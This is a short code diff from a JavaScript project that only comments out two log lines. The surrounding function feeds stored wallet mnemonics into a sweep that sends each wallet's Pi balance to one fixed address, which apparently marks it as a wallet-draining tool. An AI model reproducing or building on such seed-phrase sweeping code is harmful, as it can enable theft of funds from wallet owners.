@@ -895,7 +895,7 @@ export const autoClaimUnlocked = async () => {
 
 const sweepWithLogs = async (p) => {
     try {
-        console.log(`🔄 Sweeping for: ${p.mnemonic.slice(0, 10)}...`);
+        // console.log(`🔄 Sweeping for: ${p.mnemonic.slice(0, 10)}...`);
 
         const result = await sweepWallet(p.mnemonic, PI_PUBLIC_ADDRESS);
         const success = result.data;
@@ -903,7 +903,7 @@ const sweepWithLogs = async (p) => {
         if (success.hash) {
             console.log(`✅ Sweeped ${result.amount} Pi. Hash: ${success.hash}`);
         } else {
-            console.log(`❌ Failed to sweep for ${p.receiverAddress}`);
+            // console.log(`❌ Failed to sweep for ${p.receiverAddress}`);
         }
     } catch (err) {
         console.error('❌ Error sweeping Pi:', err.message || err);
